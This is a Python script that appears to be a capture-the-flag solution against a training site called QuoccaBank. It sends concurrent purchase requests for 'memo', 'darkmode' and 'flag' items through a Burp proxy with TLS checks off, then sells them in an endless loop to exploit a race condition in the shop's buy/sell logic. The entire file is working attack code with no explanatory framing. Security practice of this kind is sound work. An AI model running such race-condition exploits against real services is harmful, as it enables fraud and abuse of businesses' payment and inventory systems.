import requests
import threading
from urllib3.exceptions import InsecureRequestWarning
# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

s = requests.session() # This session object saves our settings for the lifetime of the script.
s.verify = False # Skip trying to verify TLS certs, due to Burp's CA.
s.proxies = {"https": "http://127.0.0.1:8080"} # Proxy requests through Burp.


buy_url = 'https://relax.quoccabank.com/service/items/buy'
sell_url = 'https://relax.quoccabank.com/service/items/sell'
headers = {'Content-Type': 'application/json'}
both_done_event = threading.Event()

def sell_all():
    response = s.post(sell_url, headers=headers, json={"item": "memo"})
    response = s.post(sell_url, headers=headers, json={"item": "darkmode"})
    response = s.post(sell_url, headers=headers, json={"item": "flag"})
    print(response.text)

def buy(payload):
    s.post(buy_url, headers=headers, json=payload)
    both_done_event.set()

while True:
    both_done_event.clear()
    threading.Thread(target=buy, args=({"item": "memo"},)).start()
    threading.Thread(target=buy, args=({"item": "darkmode"},)).start()
    threading.Thread(target=buy, args=({"item": "flag"},)).start()
    both_done_event.wait()
    sell_all()
